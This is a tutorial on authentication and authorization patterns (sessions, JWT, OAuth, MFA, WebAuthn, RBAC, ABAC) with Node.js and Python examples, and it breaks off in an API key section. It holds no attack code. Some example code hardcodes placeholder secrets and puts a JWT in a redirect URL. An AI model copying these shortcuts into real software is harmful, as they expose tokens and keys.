# Authentication, Authorization, and Security

## What You'll Learn

- **Authentication patterns**: JWT, sessions, OAuth 2.0, OIDC, MFA, WebAuthn
- **Authorization models**: RBAC, ABAC, permission systems
- **Security best practices**: HTTPS, rate limiting, injection prevention
- **Real-world implementations**: How GitHub, AWS, Auth0 handle auth
- **Trade-offs**: When to use each pattern

## Table of Contents

1. [Authentication vs Authorization](#authentication-vs-authorization)
2. [Authentication Patterns](#authentication-patterns)
3. [Authorization Patterns](#authorization-patterns)
4. [Security Best Practices](#security-best-practices)
5. [Real-World Examples](#real-world-examples)
6. [Interview Questions](#interview-questions)
7. [Practice Exercises](#practice-exercises)

---

## Authentication vs Authorization

```
Authentication (AuthN):
───────────────────────
"Who are you?"
└─ Proving identity
└─ Login with username/password
└─ Result: User ID

Authorization (AuthZ):
──────────────────────
"What can you do?"
└─ Checking permissions
└─ Can user delete this resource?
└─ Result: Allow/Deny

Example:
────────
1. User logs in (Authentication)
   └─ "I'm user ID 12345"

2. User tries to delete post (Authorization)
   └─ "Can user 12345 delete post 789?"
   └─ Check: Is user admin? Is user the author?
   └─ Result: ✅ Allow or ❌ Deny
```

---

## Authentication Patterns

### 1. Session-Based Authentication

```
Classic Web Authentication:
───────────────────────────

Flow:
─────
1. User logs in with credentials
   POST /login
   { "username": "alice", "password": "secret123" }

2. Server validates credentials
   ├─ Check password hash
   ├─ If valid: Create session
   └─ Store session in database/Redis

3. Server sends session ID in cookie
   Set-Cookie: sessionId=abc123; HttpOnly; Secure

4. Future requests include cookie
   Cookie: sessionId=abc123

5. Server validates session on each request
   ├─ Look up session in Redis
   ├─ If exists: User is authenticated
   └─ Load user data from session

Logout:
───────
DELETE /logout
└─ Server deletes session from store
└─ Clear cookie
```

**Pros:**
```
✅ Server has full control
✅ Can revoke sessions instantly
✅ Secure (session ID is random)
✅ Works great for traditional web apps
```

**Cons:**
```
❌ Requires session storage (Redis/database)
❌ Harder to scale horizontally
❌ Sticky sessions or shared Redis needed
❌ Not ideal for APIs (cookies don't work well)
```

**Implementation (Node.js):**

```javascript
// Session-based auth with Express
const express = require('express');
const session = require('express-session');
const RedisStore = require('connect-redis').default;
const redis = require('redis');
const bcrypt = require('bcrypt');

const app = express();
const redisClient = redis.createClient();

// Configure session middleware
app.use(session({
  store: new RedisStore({ client: redisClient }),
  secret: 'your-secret-key',
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: true,      // HTTPS only
    httpOnly: true,    // No JavaScript access
    maxAge: 1000 * 60 * 60 * 24,  // 24 hours
    sameSite: 'strict' // CSRF protection
  }
}));

// Login endpoint
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  
  // Find user in database
  const user = await db.users.findOne({ username });
  if (!user) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  // Verify password
  const isValid = await bcrypt.compare(password, user.passwordHash);
  if (!isValid) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  // Create session
  req.session.userId = user.id;
  req.session.username = user.username;
  req.session.roles = user.roles;
  
  res.json({ message: 'Login successful', user: { id: user.id, username: user.username } });
});

// Protected route
app.get('/profile', (req, res) => {
  if (!req.session.userId) {
    return res.status(401).json({ error: 'Not authenticated' });
  }
  
  res.json({
    userId: req.session.userId,
    username: req.session.username
  });
});

// Logout endpoint
app.post('/logout', (req, res) => {
  req.session.destroy((err) => {
    if (err) {
      return res.status(500).json({ error: 'Logout failed' });
    }
    res.clearCookie('connect.sid');
    res.json({ message: 'Logout successful' });
  });
});
```

---

### 2. JWT (JSON Web Token) Authentication

```
Stateless Authentication:
─────────────────────────

Flow:
─────
1. User logs in
   POST /login
   { "username": "alice", "password": "secret123" }

2. Server validates credentials
   └─ If valid: Generate JWT

3. Server returns JWT
   {
     "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
   }

4. Client stores JWT (localStorage/memory)

5. Client sends JWT in header
   Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

6. Server validates JWT signature
   ├─ Decode and verify signature
   ├─ Check expiration
   └─ Extract user data from payload

JWT Structure:
──────────────
Header.Payload.Signature

Header:
{
  "alg": "HS256",
  "typ": "JWT"
}

Payload:
{
  "sub": "12345",           // Subject (user ID)
  "username": "alice",
  "roles": ["user", "admin"],
  "iat": 1516239022,        // Issued at
  "exp": 1516242622         // Expires at (1 hour)
}

Signature:
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  secret
)
```

**Pros:**
```
✅ Stateless (no session storage needed)
✅ Scales horizontally easily
✅ Works great for APIs and microservices
✅ Can include user data in token
✅ Cross-domain authentication
```

**Cons:**
```
❌ Can't revoke tokens (until expiration)
❌ Token size larger than session ID
❌ Need refresh tokens for long sessions
❌ Vulnerable if token stolen
```

**Implementation (Node.js):**

```javascript
const jwt = require('jsonwebtoken');
const bcrypt = require('bcrypt');

const JWT_SECRET = process.env.JWT_SECRET;
const JWT_EXPIRES_IN = '1h';
const REFRESH_TOKEN_EXPIRES_IN = '7d';

// Login endpoint
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  
  const user = await db.users.findOne({ username });
  if (!user) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  const isValid = await bcrypt.compare(password, user.passwordHash);
  if (!isValid) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  // Generate access token (short-lived)
  const accessToken = jwt.sign(
    {
      sub: user.id,
      username: user.username,
      roles: user.roles
    },
    JWT_SECRET,
    { expiresIn: JWT_EXPIRES_IN }
  );
  
  // Generate refresh token (long-lived)
  const refreshToken = jwt.sign(
    { sub: user.id },
    JWT_SECRET,
    { expiresIn: REFRESH_TOKEN_EXPIRES_IN }
  );
  
  // Store refresh token in database
  await db.refreshTokens.create({
    userId: user.id,
    token: refreshToken,
    expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000)
  });
  
  res.json({
    accessToken,
    refreshToken,
    expiresIn: 3600
  });
});

// Middleware to verify JWT
const authenticateJWT = (req, res, next) => {
  const authHeader = req.headers.authorization;
  
  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'No token provided' });
  }
  
  const token = authHeader.substring(7);
  
  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    req.user = decoded;
    next();
  } catch (err) {
    if (err.name === 'TokenExpiredError') {
      return res.status(401).json({ error: 'Token expired' });
    }
    return res.status(403).json({ error: 'Invalid token' });
  }
};

// Protected route
app.get('/profile', authenticateJWT, (req, res) => {
  res.json({
    userId: req.user.sub,
    username: req.user.username,
    roles: req.user.roles
  });
});

// Refresh token endpoint
app.post('/refresh', async (req, res) => {
  const { refreshToken } = req.body;
  
  if (!refreshToken) {
    return res.status(401).json({ error: 'No refresh token provided' });
  }
  
  try {
    // Verify refresh token
    const decoded = jwt.verify(refreshToken, JWT_SECRET);
    
    // Check if refresh token exists in database
    const storedToken = await db.refreshTokens.findOne({
      userId: decoded.sub,
      token: refreshToken
    });
    
    if (!storedToken) {
      return res.status(403).json({ error: 'Invalid refresh token' });
    }
    
    // Get user data
    const user = await db.users.findById(decoded.sub);
    
    // Generate new access token
    const accessToken = jwt.sign(
      {
        sub: user.id,
        username: user.username,
        roles: user.roles
      },
      JWT_SECRET,
      { expiresIn: JWT_EXPIRES_IN }
    );
    
    res.json({ accessToken, expiresIn: 3600 });
  } catch (err) {
    return res.status(403).json({ error: 'Invalid refresh token' });
  }
});
```

**Python Implementation (FastAPI):**

```python
from fastapi import FastAPI, Depends, HTTPException, status
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from jose import JWTError, jwt
from passlib.context import CryptContext
from datetime import datetime, timedelta
from pydantic import BaseModel

app = FastAPI()
security = HTTPBearer()
pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")

SECRET_KEY = "your-secret-key"
ALGORITHM = "HS256"
ACCESS_TOKEN_EXPIRE_MINUTES = 60

class LoginRequest(BaseModel):
    username: str
    password: str

def create_access_token(data: dict, expires_delta: timedelta = None):
    to_encode = data.copy()
    expire = datetime.utcnow() + (expires_delta or timedelta(minutes=15))
    to_encode.update({"exp": expire})
    return jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)

def verify_password(plain_password, hashed_password):
    return pwd_context.verify(plain_password, hashed_password)

async def get_current_user(credentials: HTTPAuthorizationCredentials = Depends(security)):
    token = credentials.credentials
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        user_id: str = payload.get("sub")
        if user_id is None:
            raise HTTPException(status_code=401, detail="Invalid token")
        return payload
    except JWTError:
        raise HTTPException(status_code=401, detail="Invalid token")

@app.post("/login")
async def login(request: LoginRequest):
    # Verify user credentials
    user = await db.users.find_one({"username": request.username})
    if not user or not verify_password(request.password, user["password_hash"]):
        raise HTTPException(status_code=401, detail="Invalid credentials")
    
    access_token = create_access_token(
        data={"sub": str(user["_id"]), "username": user["username"], "roles": user["roles"]},
        expires_delta=timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
    )
    
    return {"access_token": access_token, "token_type": "bearer"}

@app.get("/profile")
async def get_profile(current_user: dict = Depends(get_current_user)):
    return {
        "user_id": current_user["sub"],
        "username": current_user["username"],
        "roles": current_user["roles"]
    }
```

---

### 3. JWT vs Session Comparison

```
┌─────────────────────┬──────────────────────┬──────────────────────┐
│ Aspect              │ Session-Based        │ JWT-Based            │
├─────────────────────┼──────────────────────┼──────────────────────┤
│ Storage             │ Server (Redis/DB)    │ Client (localStorage)│
│ Scalability         │ Needs shared storage │ Scales easily        │
│ Revocation          │ Instant              │ Difficult            │
│ Size                │ Small (session ID)   │ Large (full token)   │
│ State               │ Stateful             │ Stateless            │
│ Best For            │ Web apps             │ APIs, microservices  │
│ Mobile Apps         │ Poor fit             │ Great fit            │
│ Cross-domain        │ Difficult            │ Easy                 │
└─────────────────────┴──────────────────────┴──────────────────────┘

When to Use Sessions:
─────────────────────
✅ Traditional web applications
✅ Need instant logout/session revocation
✅ Single domain application
✅ Server-side rendering

When to Use JWT:
────────────────
✅ Microservices architecture
✅ Mobile applications
✅ Third-party API access
✅ Distributed systems
✅ Cross-domain authentication

Hybrid Approach (Best of Both):
────────────────────────────────
1. Use short-lived JWT (15 min)
2. Use long-lived refresh token (7 days)
3. Store refresh tokens in database
4. Can revoke refresh tokens
5. Access tokens auto-expire quickly
```

---

### 4. OAuth 2.0 and OpenID Connect (OIDC)

```
OAuth 2.0:
──────────
Authorization framework
└─ "Allow GitHub to access your Google contacts"
└─ Delegation of access
└─ NOT for authentication (common misconception)

OpenID Connect (OIDC):
──────────────────────
Authentication layer on top of OAuth 2.0
└─ "Sign in with Google"
└─ Provides identity information
└─ Built on OAuth 2.0
```

**OAuth 2.0 Flow (Authorization Code):**

```mermaid
sequenceDiagram
    participant User
    participant Client as Your App
    participant AuthServer as Auth Server<br/>(Google, GitHub)
    participant ResourceServer as Resource Server<br/>(Google APIs)
    
    User->>Client: Click "Login with Google"
    Client->>AuthServer: Redirect to /authorize<br/>?client_id=...&redirect_uri=...&scope=...
    AuthServer->>User: Show login page
    User->>AuthServer: Enter credentials & consent
    AuthServer->>Client: Redirect to callback<br/>?code=AUTH_CODE
    Client->>AuthServer: POST /token<br/>code=AUTH_CODE&client_secret=...
    AuthServer->>Client: access_token + refresh_token
    Client->>ResourceServer: GET /api/user<br/>Authorization: Bearer ACCESS_TOKEN
    ResourceServer->>Client: User data
    Client->>User: Logged in!
```

**OAuth 2.0 Grant Types:**

```
1. Authorization Code (most secure):
   ─────────────────────────────────
   ✅ For web apps with backend
   ✅ Client secret stored securely
   ✅ Most common flow
   
   Example: "Sign in with GitHub"

2. Authorization Code + PKCE:
   ───────────────────────────
   ✅ For mobile apps & SPAs
   ✅ No client secret needed
   ✅ Uses code_challenge/code_verifier
   
   Example: Mobile app login

3. Client Credentials:
   ────────────────────
   ✅ For server-to-server
   ✅ No user involved
   ✅ Machine-to-machine
   
   Example: Backend service calling API

4. Refresh Token:
   ───────────────
   ✅ Get new access token
   ✅ Without re-authenticating
   
   Example: Keep user logged in

⚠️ Deprecated Flows (Don't Use):
  ❌ Implicit Flow (insecure for SPAs)
  ❌ Password Grant (anti-pattern)
```

**Implementation (OAuth 2.0 Authorization Code):**

```javascript
// Using Passport.js with Google OAuth
const passport = require('passport');
const GoogleStrategy = require('passport-google-oauth20').Strategy;

passport.use(new GoogleStrategy({
    clientID: process.env.GOOGLE_CLIENT_ID,
    clientSecret: process.env.GOOGLE_CLIENT_SECRET,
    callbackURL: "https://yourapp.com/auth/google/callback"
  },
  async (accessToken, refreshToken, profile, done) => {
    // Find or create user
    let user = await db.users.findOne({ googleId: profile.id });
    
    if (!user) {
      user = await db.users.create({
        googleId: profile.id,
        email: profile.emails[0].value,
        name: profile.displayName,
        avatar: profile.photos[0].value
      });
    }
    
    return done(null, user);
  }
));

// Routes
app.get('/auth/google',
  passport.authenticate('google', { scope: ['profile', 'email'] })
);

app.get('/auth/google/callback', 
  passport.authenticate('google', { failureRedirect: '/login' }),
  (req, res) => {
    // Success - create session or JWT
    const token = jwt.sign({ sub: req.user.id }, JWT_SECRET);
    res.redirect(`/dashboard?token=${token}`);
  }
);
```

---

### 5. Multi-Factor Authentication (MFA)

```
Why MFA?
────────
Password alone is weak:
├─ Can be guessed
├─ Can be phished
├─ Can be breached
└─ Can be reused

MFA adds layers:
────────────────
Something you know     + Something you have      + Something you are
(Password)              (Phone, security key)     (Fingerprint, face)

Common MFA Methods:
───────────────────
1. SMS OTP (One-Time Password)
   └─ ⚠️ Least secure (SIM swapping attacks)

2. TOTP (Time-based OTP) - Google Authenticator
   └─ ✅ More secure, offline

3. Push Notification - Duo, Authy
   └─ ✅ User-friendly

4. Hardware Token - YubiKey
   └─ ✅ Most secure

5. Biometric - Face ID, Touch ID
   └─ ✅ Very convenient
```

**MFA Flow:**

```mermaid
sequenceDiagram
    participant User
    participant App
    participant Auth as Auth Server
    participant MFA as MFA Provider<br/>(SMS, TOTP)
    
    User->>App: Enter username/password
    App->>Auth: Verify credentials
    Auth->>App: ✅ Valid (but MFA required)
    App->>User: Show MFA prompt
    User->>MFA: Request OTP (or use authenticator app)
    MFA->>User: 6-digit code: 123456
    User->>App: Enter code: 123456
    App->>Auth: Verify MFA code
    Auth->>App: ✅ MFA valid
    App->>User: Logged in!
```

**TOTP Implementation (Node.js):**

```javascript
const speakeasy = require('speakeasy');
const QRCode = require('qrcode');

// Enable MFA for user
app.post('/mfa/enable', authenticateJWT, async (req, res) => {
  // Generate secret
  const secret = speakeasy.generateSecret({
    name: `YourApp (${req.user.username})`,
    issuer: 'YourApp'
  });
  
  // Save secret to user (encrypted)
  await db.users.update(
    { id: req.user.sub },
    { mfaSecret: secret.base32, mfaEnabled: false } // Not enabled until verified
  );
  
  // Generate QR code for user to scan
  const qrCodeUrl = await QRCode.toDataURL(secret.otpauth_url);
  
  res.json({
    secret: secret.base32,
    qrCode: qrCodeUrl
  });
});

// Verify and activate MFA
app.post('/mfa/verify', authenticateJWT, async (req, res) => {
  const { token } = req.body;
  
  const user = await db.users.findById(req.user.sub);
  
  // Verify TOTP token
  const isValid = speakeasy.totp.verify({
    secret: user.mfaSecret,
    encoding: 'base32',
    token: token,
    window: 2 // Allow 2 time steps (60 seconds)
  });
  
  if (!isValid) {
    return res.status(400).json({ error: 'Invalid code' });
  }
  
  // Enable MFA
  await db.users.update(
    { id: req.user.sub },
    { mfaEnabled: true }
  );
  
  res.json({ message: 'MFA enabled successfully' });
});

// Login with MFA
app.post('/login', async (req, res) => {
  const { username, password, mfaToken } = req.body;
  
  const user = await db.users.findOne({ username });
  if (!user || !await bcrypt.compare(password, user.passwordHash)) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  // Check if MFA is enabled
  if (user.mfaEnabled) {
    if (!mfaToken) {
      return res.status(200).json({ 
        mfaRequired: true,
        message: 'MFA code required'
      });
    }
    
    // Verify MFA token
    const isMfaValid = speakeasy.totp.verify({
      secret: user.mfaSecret,
      encoding: 'base32',
      token: mfaToken,
      window: 2
    });
    
    if (!isMfaValid) {
      return res.status(401).json({ error: 'Invalid MFA code' });
    }
  }
  
  // Generate JWT
  const token = jwt.sign(
    { sub: user.id, username: user.username },
    JWT_SECRET,
    { expiresIn: '1h' }
  );
  
  res.json({ accessToken: token });
});
```

---

### 6. WebAuthn and Passkeys (Passwordless)

```
The Future of Authentication:
─────────────────────────────
❌ Passwords: Weak, reused, phishable
✅ Passkeys: Strong, unique, phish-resistant

WebAuthn (Web Authentication API):
───────────────────────────────────
W3C standard for passwordless auth
├─ Uses public-key cryptography
├─ Hardware security keys (YubiKey)
├─ Biometric authentication (Face ID, Touch ID)
└─ No shared secrets

Passkeys:
─────────
Consumer-friendly term for WebAuthn
├─ Stored in password manager (iCloud, Google)
├─ Synced across devices
├─ Can't be phished
└─ No password to remember

How It Works:
─────────────
Registration:
1. User wants to register
2. Browser generates key pair (private + public)
3. Private key stored on device (never leaves)
4. Public key sent to server
5. Server stores public key with user account

Authentication:
1. User wants to login
2. Server sends challenge (random data)
3. Device signs challenge with private key
4. Server verifies signature with public key
5. User authenticated!
```

**WebAuthn Flow:**

```mermaid
sequenceDiagram
    participant User
    participant Browser
    participant Server
    participant Authenticator as Authenticator<br/>(YubiKey, Face ID)
    
    Note over User,Authenticator: Registration
    User->>Server: Start registration
    Server->>Browser: Challenge + options
    Browser->>Authenticator: Create credential
    Authenticator->>User: Verify identity (biometric)
    Authenticator->>Browser: Public key + credential ID
    Browser->>Server: Public key + credential ID
    Server->>Server: Store public key
    
    Note over User,Authenticator: Authentication
    User->>Server: Start login
    Server->>Browser: Challenge
    Browser->>Authenticator: Sign challenge
    Authenticator->>User: Verify identity
    Authenticator->>Browser: Signed challenge
    Browser->>Server: Signed challenge
    Server->>Server: Verify signature
    Server->>Browser: ✅ Authenticated
```

**WebAuthn Implementation:**

```javascript
// Using @simplewebauthn/server
const {
  generateRegistrationOptions,
  verifyRegistrationResponse,
  generateAuthenticationOptions,
  verifyAuthenticationResponse,
} = require('@simplewebauthn/server');

const rpName = 'YourApp';
const rpID = 'yourapp.com';
const origin = 'https://yourapp.com';

// Registration - Step 1: Generate options
app.post('/webauthn/register/options', authenticateJWT, async (req, res) => {
  const user = await db.users.findById(req.user.sub);
  
  const options = await generateRegistrationOptions({
    rpName,
    rpID,
    userID: user.id,
    userName: user.username,
    userDisplayName: user.name,
    attestationType: 'none',
    authenticatorSelection: {
      residentKey: 'preferred',
      userVerification: 'preferred',
    },
  });
  
  // Save challenge for verification
  await db.users.update(
    { id: user.id },
    { currentChallenge: options.challenge }
  );
  
  res.json(options);
});

// Registration - Step 2: Verify response
app.post('/webauthn/register/verify', authenticateJWT, async (req, res) => {
  const user = await db.users.findById(req.user.sub);
  
  try {
    const verification = await verifyRegistrationResponse({
      response: req.body,
      expectedChallenge: user.currentChallenge,
      expectedOrigin: origin,
      expectedRPID: rpID,
    });
    
    if (verification.verified) {
      // Save credential
      await db.credentials.create({
        userId: user.id,
        credentialID: verification.registrationInfo.credentialID,
        publicKey: verification.registrationInfo.credentialPublicKey,
        counter: verification.registrationInfo.counter,
      });
      
      res.json({ verified: true });
    } else {
      res.status(400).json({ error: 'Verification failed' });
    }
  } catch (error) {
    res.status(400).json({ error: error.message });
  }
});

// Authentication - Step 1: Generate options
app.post('/webauthn/login/options', async (req, res) => {
  const { username } = req.body;
  const user = await db.users.findOne({ username });
  
  if (!user) {
    return res.status(404).json({ error: 'User not found' });
  }
  
  const credentials = await db.credentials.find({ userId: user.id });
  
  const options = await generateAuthenticationOptions({
    rpID,
    allowCredentials: credentials.map(cred => ({
      id: cred.credentialID,
      type: 'public-key',
    })),
    userVerification: 'preferred',
  });
  
  await db.users.update(
    { id: user.id },
    { currentChallenge: options.challenge }
  );
  
  res.json(options);
});

// Authentication - Step 2: Verify response
app.post('/webauthn/login/verify', async (req, res) => {
  const { username, response } = req.body;
  
  const user = await db.users.findOne({ username });
  const credential = await db.credentials.findOne({
    credentialID: response.id,
    userId: user.id
  });
  
  try {
    const verification = await verifyAuthenticationResponse({
      response,
      expectedChallenge: user.currentChallenge,
      expectedOrigin: origin,
      expectedRPID: rpID,
      authenticator: {
        credentialID: credential.credentialID,
        credentialPublicKey: credential.publicKey,
        counter: credential.counter,
      },
    });
    
    if (verification.verified) {
      // Update counter
      await db.credentials.update(
        { id: credential.id },
        { counter: verification.authenticationInfo.newCounter }
      );
      
      // Generate JWT
      const token = jwt.sign(
        { sub: user.id, username: user.username },
        JWT_SECRET,
        { expiresIn: '1h' }
      );
      
      res.json({ verified: true, accessToken: token });
    } else {
      res.status(400).json({ error: 'Verification failed' });
    }
  } catch (error) {
    res.status(400).json({ error: error.message });
  }
});
```

---

### 7. Single Sign-On (SSO) and SAML

```
Single Sign-On (SSO):
─────────────────────
Log in once, access multiple apps
├─ Corporate environment: Login to Windows → Access all apps
├─ Consumer: Login to Google → Access Gmail, Drive, YouTube
└─ Reduces password fatigue

SAML (Security Assertion Markup Language):
───────────────────────────────────────────
Enterprise SSO standard
├─ XML-based protocol
├─ Used by corporate identity providers
├─ Common in B2B applications
└─ Examples: Okta, Azure AD, OneLogin

SAML vs OAuth/OIDC:
───────────────────
┌──────────────┬──────────────┬──────────────┐
│ Aspect       │ SAML         │ OAuth/OIDC   │
├──────────────┼──────────────┼──────────────┤
│ Format       │ XML          │ JSON         │
│ Use Case     │ Enterprise   │ Consumer     │
│ Mobile       │ Poor         │ Great        │
│ Complexity   │ High         │ Medium       │
│ Age          │ Older (2005) │ Newer (2012) │
└──────────────┴──────────────┴──────────────┘
```

**SAML Flow:**

```mermaid
sequenceDiagram
    participant User
    participant SP as Service Provider<br/>(Your App)
    participant IdP as Identity Provider<br/>(Okta, Azure AD)
    
    User->>SP: Access protected resource
    SP->>SP: Not authenticated
    SP->>User: Redirect to IdP<br/>with SAML request
    User->>IdP: Login page
    User->>IdP: Enter credentials
    IdP->>IdP: Validate credentials
    IdP->>User: Redirect to SP<br/>with SAML assertion
    User->>SP: Submit SAML assertion
    SP->>SP: Validate assertion
    SP->>User: Grant access + create session
```

---

## Authorization Patterns

### 1. Role-Based Access Control (RBAC)

```
Simplest Authorization Model:
─────────────────────────────
Users → Roles → Permissions

Example:
────────
Roles:
├─ Admin: Can do everything
├─ Editor: Can create, edit, delete posts
├─ Viewer: Can only view posts
└─ Guest: Can view public posts only

User Assignment:
├─ Alice → Admin
├─ Bob → Editor
└─ Charlie → Viewer

Permission Check:
─────────────────
Question: "Can Bob delete post?"
├─ Bob has role "Editor"
├─ Editor role has "delete post" permission
└─ ✅ Allow

Question: "Can Charlie delete post?"
├─ Charlie has role "Viewer"
├─ Viewer role doesn't have "delete post"
└─ ❌ Deny
```

**RBAC Implementation:**

```javascript
// Database schema
const roles = {
  admin: ['read', 'write', 'delete', 'manage_users'],
  editor: ['read', 'write', 'delete'],
  viewer: ['read'],
  guest: []
};

// Middleware to check permission
const requirePermission = (permission) => {
  return async (req, res, next) => {
    if (!req.user) {
      return res.status(401).json({ error: 'Not authenticated' });
    }
    
    const user = await db.users.findById(req.user.sub);
    const userPermissions = roles[user.role] || [];
    
    if (!userPermissions.includes(permission)) {
      return res.status(403).json({ error: 'Insufficient permissions' });
    }
    
    next();
  };
};

// Routes
app.get('/posts', authenticateJWT, requirePermission('read'), async (req, res) => {
  const posts = await db.posts.find();
  res.json(posts);
});

app.post('/posts', authenticateJWT, requirePermission('write'), async (req, res) => {
  const post = await db.posts.create(req.body);
  res.json(post);
});

app.delete('/posts/:id', authenticateJWT, requirePermission('delete'), async (req, res) => {
  await db.posts.delete(req.params.id);
  res.json({ message: 'Post deleted' });
});

// Admin-only route
app.post('/users', authenticateJWT, requirePermission('manage_users'), async (req, res) => {
  const user = await db.users.create(req.body);
  res.json(user);
});
```

**Hierarchical RBAC:**

```javascript
// Role hierarchy: Admin > Editor > Viewer > Guest
const roleHierarchy = {
  admin: ['admin', 'editor', 'viewer', 'guest'],
  editor: ['editor', 'viewer', 'guest'],
  viewer: ['viewer', 'guest'],
  guest: ['guest']
};

const hasRole = (userRole, requiredRole) => {
  return roleHierarchy[userRole]?.includes(requiredRole) || false;
};

// Example
hasRole('admin', 'viewer');  // ✅ true (admin includes viewer)
hasRole('viewer', 'editor'); // ❌ false (viewer doesn't include editor)
```

**Pros:**
```
✅ Simple to understand and implement
✅ Easy to manage (just assign roles)
✅ Works well for small to medium apps
✅ Clear separation of concerns
```

**Cons:**
```
❌ Role explosion (too many roles)
❌ Not flexible for complex scenarios
❌ Hard to model "own resources" (e.g., edit own posts)
❌ Can't handle contextual permissions
```

---

### 2. Attribute-Based Access Control (ABAC)

```
Flexible Authorization Model:
─────────────────────────────
Access based on attributes of:
├─ User (role, department, location)
├─ Resource (owner, type, sensitivity)
├─ Environment (time, IP, device)
└─ Action (read, write, delete)

Example Policy:
───────────────
Allow if:
├─ User.role == "editor"
├─ AND Resource.status == "draft"
├─ AND Time.hour >= 9 AND Time.hour <= 17
└─ AND User.department == Resource.department

More flexible than RBAC!
```

**ABAC Implementation:**

```javascript
// Policy engine
class PolicyEngine {
  static policies = [
    {
      name: 'Editors can edit their own posts',
      effect: 'allow',
      actions: ['update', 'delete'],
      resources: ['post'],
      conditions: (user, resource) => {
        return user.role === 'editor' && resource.authorId === user.id;
      }
    },
    {
      name: 'Admins can edit any post',
      effect: 'allow',
      actions: ['update', 'delete'],
      resources: ['post'],
      conditions: (user, resource) => {
        return user.role === 'admin';
      }
    },
    {
      name: 'Users can only edit during business hours',
      effect: 'deny',
      actions: ['update', 'delete'],
      resources: ['post'],
      conditions: (user, resource, context) => {
        const hour = new Date().getHours();
        return hour < 9 || hour > 17;
      }
    }
  ];
  
  static evaluate(user, action, resource, context = {}) {
    for (const policy of this.policies) {
      // Check if policy applies
      if (!policy.actions.includes(action)) continue;
      if (!policy.resources.includes(resource.type)) continue;
      
      // Evaluate conditions
      const conditionMet = policy.conditions(user, resource, context);
      
      if (conditionMet) {
        return policy.effect === 'allow';
      }
    }
    
    // Default deny
    return false;
  }
}

// Middleware
const authorize = (action) => {
  return async (req, res, next) => {
    const user = await db.users.findById(req.user.sub);
    const resource = await db.posts.findById(req.params.id);
    
    const allowed = PolicyEngine.evaluate(user, action, {
      type: 'post',
      authorId: resource.authorId,
      status: resource.status
    });
    
    if (!allowed) {
      return res.status(403).json({ error: 'Access denied' });
    }
    
    next();
  };
};

// Routes
app.put('/posts/:id', authenticateJWT, authorize('update'), async (req, res) => {
  const post = await db.posts.update(req.params.id, req.body);
  res.json(post);
});
```

**Real-World Example (AWS IAM):**

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "s3:GetObject",
      "Resource": "arn:aws:s3:::my-bucket/*",
      "Condition": {
        "IpAddress": {
          "aws:SourceIp": "203.0.113.0/24"
        },
        "DateGreaterThan": {
          "aws:CurrentTime": "2024-01-01T00:00:00Z"
        }
      }
    }
  ]
}
```

**Pros:**
```
✅ Very flexible
✅ Fine-grained control
✅ Handles complex scenarios
✅ Contextual permissions
```

**Cons:**
```
❌ Complex to implement
❌ Harder to understand
❌ Performance overhead
❌ Difficult to audit
```

---

### 3. Resource-Based Permissions

```
Permissions Attached to Resources:
───────────────────────────────────
Instead of "User has permission"
Think: "User has permission on THIS resource"

Example:
────────
Post #123:
├─ Owner: Alice (all permissions)
├─ Collaborators:
│  ├─ Bob (read, write)
│  └─ Charlie (read)
└─ Public: (none)

Google Docs-style Sharing!
```

**Implementation:**

```javascript
// Database schema
const postSchema = {
  id: 'post-123',
  title: 'My Post',
  content: '...',
  ownerId: 'user-1',
  permissions: [
    { userId: 'user-1', level: 'owner' },
    { userId: 'user-2', level: 'editor' },
    { userId: 'user-3', level: 'viewer' }
  ],
  public: false
};

// Permission levels
const permissionLevels = {
  owner: ['read', 'write', 'delete', 'share'],
  editor: ['read', 'write'],
  viewer: ['read']
};

// Check permission
const checkResourcePermission = async (userId, resourceId, action) => {
  const resource = await db.posts.findById(resourceId);
  
  // Check if public
  if (resource.public && action === 'read') {
    return true;
  }
  
  // Find user's permission on this resource
  const userPermission = resource.permissions.find(p => p.userId === userId);
  
  if (!userPermission) {
    return false;
  }
  
  // Check if permission level includes the action
  const allowedActions = permissionLevels[userPermission.level];
  return allowedActions.includes(action);
};

// Middleware
const requireResourcePermission = (action) => {
  return async (req, res, next) => {
    const allowed = await checkResourcePermission(
      req.user.sub,
      req.params.id,
      action
    );
    
    if (!allowed) {
      return res.status(403).json({ error: 'Access denied' });
    }
    
    next();
  };
};

// Share resource
app.post('/posts/:id/share', authenticateJWT, async (req, res) => {
  const { userId, level } = req.body;
  
  // Check if current user is owner
  const isOwner = await checkResourcePermission(req.user.sub, req.params.id, 'share');
  
  if (!isOwner) {
    return res.status(403).json({ error: 'Only owner can share' });
  }
  
  // Add permission
  await db.posts.update(req.params.id, {
    $push: {
      permissions: { userId, level }
    }
  });
  
  res.json({ message: 'Shared successfully' });
});
```

---

### 4. API Key Management

```
API Keys for Programmatic Access:
──────────────────────────────────
├─ Long-lived credentials
├─ For machine-to-machine
├─ No user interaction
└─ Example: Third-party integrations

API Key Structure:
──────────────────
app_live_sk_1a2b3c4d5e6f7g8h9i0j

Prefix: app_live_sk_
└─ app: Service name
└─ live: Environment (live, test)
└─ sk: Secret key
└─ Hash: Random unique identifier

Why prefix?
├─ Easy to identify in logs
├─ Can search codebase for leaked keys
└─ GitHub secret scanning
```

**API Key Implementation:**

```javascript
const crypto = require('crypto');

// Generate API key
const generateApiKey = (userId, name) => {
  const randomBytes = crypto.randomBytes(32).toString('hex');
  const prefix = 'app_live_sk_';
